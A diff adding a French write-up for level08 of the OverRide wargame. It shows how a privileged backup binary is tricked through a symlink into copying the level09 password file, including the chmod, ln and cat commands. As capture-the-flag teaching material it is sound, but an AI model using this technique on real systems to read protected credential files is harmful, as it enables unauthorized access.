@@ -9,4 +9,24 @@
 |    |    |
 | :- | :- |
 | **Architecture** | x64 |
-| **Exploit type** |  |
+| **Exploit type** | N/A |
+
+Quand on lance le programme, on nous demande un fichier.\
+Si on passe le .pass local (`./level08 .pass`), on obtient un nouveau fichier dans un dossier `backup`, nommé `.pass`, et lisible.
+
+En regardant le code, on se rend compte que rien ne protège la lecture d'un fichier. On va donc simplement ouvrir le fichier du level09.
+
+```bash
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+```
+
+Le problème est qu'il essaie de créer un fichier avec un nom invalide.\
+Mais on sait qu'on peut faire un lien symbolique sur un fichier sur lequel on a pas d'autorisation. On pourra utiliser ce lien pour lire le contenu du pass du level09.
+
+```bash
+level08@OverRide:~$ chmod 777 .
+level08@OverRide:~$ ln -sf /home/users/level09/.pass level09
+level08@OverRide:~$ ./level08 level09
+level08@OverRide:~$ cat backups/level09
+```
